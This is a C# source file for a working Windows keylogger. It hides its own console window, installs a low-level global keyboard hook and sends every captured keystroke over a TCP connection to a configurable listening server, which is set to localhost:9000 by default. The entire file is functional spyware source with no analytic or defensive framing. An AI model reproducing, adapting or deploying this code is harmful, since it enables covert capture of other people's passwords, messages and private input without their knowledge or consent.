using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace realtime_keylogger
{
    class Utils
    {
        public static string server = "localhost"; // Server to connect to
        public static int port = 9000; // Port to connect to on server
        
        public static TcpClient client = new TcpClient(server, port);
        public static NetworkStream stream = client.GetStream();

        public static void sendData(NetworkStream stream, string message)
        {
            Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
            try
            {
                stream.Write(data, 0, data.Length);
            } catch (Exception)
            {
                Application.Exit(); // Close
            }
        }

        public static void Close(NetworkStream stream, TcpClient client)
        {
            stream.Close(); // Close NetworkStream
            client.Close(); // Close TcpClient
        }
    }

    class InterceptKeys
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
                
        public static void Main()
        {
            var handle = GetConsoleWindow();
            
            // Hide Window
            ShowWindow(handle, SW_HIDE);

            try
            {
                _hookID = SetHook(_proc);
                System.Windows.Forms.Application.Run();
                UnhookWindowsHookEx(_hookID);
            } catch (Exception)
            {
                Application.Exit(); // Close
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                // send to listening server
                try
                {
                    Utils.sendData(Utils.stream, ((Keys)vkCode).ToString()); // Console.WriteLine((Keys)vkCode);
                } catch (Exception)
                {
                    Application.Exit(); // Close
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

    }
}
